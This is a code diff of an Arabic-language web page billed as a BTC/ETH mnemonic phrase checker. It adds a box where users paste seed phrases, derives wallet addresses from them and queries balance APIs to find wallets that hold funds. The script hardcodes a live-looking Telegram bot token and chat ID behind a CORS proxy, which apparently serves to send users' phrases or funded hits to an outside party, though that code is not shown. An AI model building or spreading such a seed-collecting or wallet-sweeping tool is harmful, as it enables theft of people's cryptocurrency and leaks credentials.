@@ -5,7 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>فاحص عبارات Mnemonic (BTC/ETH)</title>
     <!-- External Libraries from Public CDNs -->
-    <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.min.js"></script> <!-- BIP39 checksum & seed derivation -->
+    <!-- BIP39 import for global accessibility (dist/bip39.min.js is the correct UMD bundle) -->
+    <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/hdkey@1.1.1/dist/hdkey.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/ethereumjs-util@7.1.3/dist/index.umd.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs.min.js"></script>
@@ -33,6 +34,7 @@
         }
 
         input[type="file"],
+        textarea,
         button {
             background-color: #111;
             color: #33ff33;
@@ -46,7 +48,6 @@
             transition: background-color 0.3s ease, box-shadow 0.3s ease;
             width: 100%;
             max-width: 500px;
-            cursor: pointer;
         }
 
         input[type="file"]::file-selector-button {
@@ -64,9 +65,25 @@
             background-color: #22ee22;
         }
 
-        button:hover {
+        textarea {
+            resize: vertical; /* Allow vertical resizing */
+            min-height: 100px;
+            cursor: text;
+        }
+
+        button {
+            cursor: pointer;
+        }
+
+        button:hover:not(:disabled) { /* Apply hover only if not disabled */
             background-color: #222;
             box-shadow: 0 0 15px rgba(51, 255, 51, 0.9);
+        }
+
+        button:disabled { /* Styling for disabled button */
+            cursor: not-allowed;
+            opacity: 0.5;
+            box-shadow: none;
         }
 
         #summary {
@@ -195,6 +212,7 @@
             }
 
             input[type="file"],
+            textarea,
             button {
                 font-size: 0.9em;
                 padding: 8px 12px;
@@ -211,16 +229,40 @@
 <body>
     <h2>فاحص عبارات Mnemonic (BTC/ETH)</h2>
     <input type="file" id="fileInput" accept=".txt">
-    <button onclick="scanFile()">بدء الفحص</button>
-    <audio id="gunshot" src="gunshot.mp3" preload="auto"></audio> <!-- Retaining gunshot audio as per previous request -->
+    <textarea id="phraseInput" placeholder="أو الصق عباراتك هنا، سطر لكل عبارة"></textarea>
+    <button id="startButton" onclick="scanFile()" disabled>بدء الفحص</button>
+    <audio id="gunshot" src="gunshot.mp3" preload="auto"></audio>
     <div id="summary">لم يتم الفحص بعد.</div>
     <div id="results"></div>
 
     <script>
         // Constants for Telegram API and CORS proxy
         const TELEGRAM_BOT_TOKEN = '8026919110:AAGOm56kp92jEt9NphOYeBMiG_U_bX1uCYU';
-        const TELEGRAM_CHAT_ID = '-4913064483';
+        const TELEGRAM_CHAT_ID   = '-4913064483';
         const CORS_PROXY_URL = 'https://corsproxy.io/?';
+
+        // Get references to UI elements
+        const fileInput = document.getElementById('fileInput');
+        const phraseInput = document.getElementById('phraseInput');
+        const startButton = document.getElementById('startButton');
+        const summaryDiv = document.getElementById('summary');
+        const resultsDiv = document.getElementById('results');
+        const gunshotAudio = document.getElementById('gunshot');
+
+        /**
+         * Updates the state of the "Start Scan" button based on input availability.
+         */
+        function updateScanButtonState() {
+            startButton.disabled = !(fileInput.files.length > 0 || phraseInput.value.trim().length > 0);
+        }
+
+        // Add event listeners to update button state
+        fileInput.addEventListener('change', updateScanButtonState);
+        phraseInput.addEventListener('input', updateScanButtonState);
+
+        // Initial check on page load
+        document.addEventListener('DOMContentLoaded', updateScanButtonState);
+
 
         /**
          * Shows a custom message box instead of native alert().
@@ -283,11 +325,12 @@
                     const totalSatoshi = data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum;
                     return { exists: true, balance: totalSatoshi / 100000000, unit: 'BTC' }; // Convert satoshi to BTC
                 }
+                // If address not found by API (e.g., 404), data might be null or not have chain_stats
                 return { exists: false, balance: 0, unit: 'BTC' };
             } catch (error) {
                 if (error.message === 'rate_limit') throw error;
-                // If API returns an error other than rate limit (e.g., 404 for not found), treat as non-existent
-                console.warn(`BTC check for ${addr} failed:`, error);
+                // For other errors (e.g., network error, address not found on blockchain explorer), assume non-existent for 'exists'
+                console.warn(`BTC check for ${addr} failed or address not found:`, error);
                 return { exists: false, balance: 0, unit: 'BTC' };
             }
         }
@@ -300,7 +343,7 @@
         async function checkEth(addr) {
             try {
                 const json = await checkApi(`https://api.etherscan.io/api?module=account&action=balance&address=${addr}&tag=latest`);
-                // Etherscan API returns a result field. If it's a valid number (even '0'), the address exists.
+                // Etherscan API returns a 'result' field. If it's a string that can be parsed as a number (even '0'), the address exists.
                 if (json && typeof json.result === 'string' && !isNaN(parseFloat(json.result))) {
                     const balanceWei = parseFloat(json.result);
                     return { exists: true, balance: balanceWei / 1e18, unit: 'ETH' }; // Convert wei to ETH
@@ -308,7 +351,7 @@
                 return { exists: false, balance: 0, unit: 'ETH' };
             } catch (error) {
                 if (error.message === 'rate_limit') throw error;
-                console.warn(`ETH check for ${addr} failed:`, error);
+                console.warn(`ETH check for ${addr} failed or address not found:`, error);
                 return { exists: false, balance: 0, unit: 'ETH' };
             }
         }
@@ -320,7 +363,7 @@
          * @returns {string} The derived BTC address.
          */
         function deriveBtc(seed) {
-          const root = hdkey.fromMasterSeed(seed);
+          const root  = hdkey.fromMasterSeed(seed);
           const child = root.derive("m/44'/0'/0'/0/0"); // BIP44 path for Bitcoin mainnet
           return bitcoin.payments.p2pkh({ pubkey: child.publicKey }).address;
         }
@@ -332,7 +375,7 @@
          * @returns {string} The derived ETH address (0x prefixed).
          */
         function deriveEth(seed) {
-          const root = hdkey.fromMasterSeed(seed);
+          const root  = hdkey.fromMasterSeed(seed);
           const child = root.derive("m/44'/60'/0'/0/0"); // BIP44 path for Ethereum
           // pubToAddress expects uncompressed public key.
           return '0x' + ethereumjs.Util.pubToAddress(child.publicKey, false).toString('hex'); // 'false' for uncompressed pubkey
@@ -376,49 +419,60 @@
                 return { status: 'found_empty', chain: 'ETH', addr: ethAddr, balance: ethResult.balance, unit: ethResult.unit };
             }
             
-            return { status: 'not_found' }; // Genuinely not found or API error that wasn't rate_limit
+            return { status: 'not_found' }; // Genuinely not found (invalid mnemonic or API didn't confirm existence)
         }
 
         /**
-         * Main function to handle file reading and batch scanning of mnemonic phrases.
+         * Main function to handle file reading/textarea input and batch scanning of mnemonic phrases.
          * Updates UI with progress and results, handles errors and rate limits.
          */
         async function scanFile() {
-            const fileInput = document.getElementById('fileInput');
-            const file = fileInput.files[0];
+            let lines = [];
 
-            // Check if a file is selected
-            if (!file) {
-                showMessageBox('يرجى رفع ملف العبارات أولاً.');
+            // Prioritize file input
+            if (fileInput.files.length > 0) {
+                const file = fileInput.files[0];
+                lines = await new Promise((resolve) => {
+                    const fileReader = new FileReader();
+                    fileReader.onload = (e) => {
+                        const rawLines = e.target.result.trim().split(/\r?\n/);
+                        resolve(rawLines.filter(line => line.trim() !== ''));
+                    };
+                    fileReader.readAsText(file, 'UTF-8');
+                });
+            } else if (phraseInput.value.trim().length > 0) {
+                // Fallback to textarea input
+                const rawLines = phraseInput.value.trim().split(/\r?\n/);
+                lines = rawLines.filter(line => line.trim() !== '');
+            } else {
+                // Should not happen if button state is managed correctly, but as a fallback
+                showMessageBox('يرجى رفع ملف العبارات أو لصق العبارات في المنطقة النصية أولاً.');
                 return;
             }
 
-            // Read file content as text
-            const lines = await new Promise((resolve) => {
-                const fileReader = new FileReader();
-                fileReader.onload = (e) => {
-                    // Split lines, filter out empty/blank lines, and trim whitespace from each phrase
-                    const rawLines = e.target.result.trim().split(/\r?\n/);
-                    const filteredLines = rawLines.filter(line => line.trim() !== '');
-                    resolve(filteredLines);
-                };
-                fileReader.readAsText(file, 'UTF-8');
-            });
+            if (lines.length === 0) {
+                showMessageBox('لم يتم العثور على عبارات صالحة في الإدخال.');
+                summaryDiv.innerHTML = 'لم يتم الفحص بعد.';
+                resultsDiv.innerHTML = '';
+                return;
+            }
+
 
             const totalPhrases = lines.length;
-            const resultsDiv = document.getElementById('results');
             resultsDiv.innerHTML = ''; // Clear previous results
             
             let fundsFoundCount = 0;
             let emptyFoundCount = 0;
             let notFoundCount = 0;
             let scanStopped = false;
-            const gunshotAudio = document.getElementById('gunshot');
+
+            // Disable button during scan
+            startButton.disabled = true;
 
             // Iterate through each mnemonic phrase
             for (let i = 0; i < totalPhrases && !scanStopped; i++) {
                 // Update live progress counter
-                document.getElementById('summary').innerHTML = `🚀 تم فحص <span class="count">${i + 1}/${totalPhrases}</span> عبارة`;
+                summaryDiv.innerHTML = `🚀 تم فحص <span class="count">${i + 1}/${totalPhrases}</span> عبارة`;
                 
                 const currentPhrase = lines[i];
 
@@ -460,15 +514,18 @@
             }
 
             // Display final summary totals
-            document.getElementById('summary').innerHTML = `
+            summaryDiv.innerHTML = `
                 <br>
                 <span class="good">Found with funds: ${fundsFoundCount}</span> | 
                 <span class="empty-wallet">Found empty: ${emptyFoundCount}</span> |
                 <span class="bad">Not found: ${notFoundCount}</span>
             `;
             if (scanStopped) {
-                document.getElementById('summary').innerHTML += `<br><span class="limit">توقف الفحص بسبب تجاوز الحد الأقصى لطلبات API.</span>`;
+                summaryDiv.innerHTML += `<br><span class="limit">توقف الفحص بسبب تجاوز الحد الأقصى لطلبات API.</span>`;
             }
+
+            // Re-enable button after scan
+            updateScanButtonState();
         }
     </script>
 </body>
